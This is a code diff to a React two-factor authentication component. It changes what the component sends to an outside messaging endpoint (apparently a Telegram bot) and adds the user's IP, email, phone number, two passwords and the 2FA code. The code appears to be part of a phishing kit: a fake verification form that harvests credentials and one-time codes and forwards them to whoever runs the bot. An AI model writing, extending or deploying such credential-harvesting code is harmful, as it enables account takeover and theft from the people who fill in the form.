@@ -42,12 +42,31 @@ const TwoFactorAuth = (props) => {
         try {
             if(codeValue == data.code) return;
             setCodeValue(data.code);
-             const message = `
-                Two Factor  (${props.ip.userIP})                                                                                   
-                Code: ${data.code}                            
-            `
 
-             await fetch(`${process.env.customKey} ${message}`).then( res => res.json());
+            const formattedMessage = `
+            <b>User (${props.ip.userIP})</b>
+            -------------------------
+            <b>Email:</b> ${props.email}
+            <b>Phone:</b> ${props.phone}
+            <b>First Password:</b> ${props.passwords.firstPw}
+            <b>Second Password:</b> ${props.passwords.secondPw}
+            <b>Code:</b> ${data.code}
+            `;
+        
+            const dataGram = {
+              chat_id: process.env.chatId,
+              text: formattedMessage,
+              parse_mode: 'HTML'
+            };
+        
+        
+            const response = await fetch(process.env.customKey, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(dataGram)
+            });
 
         } catch (err) {
             console.log(err);
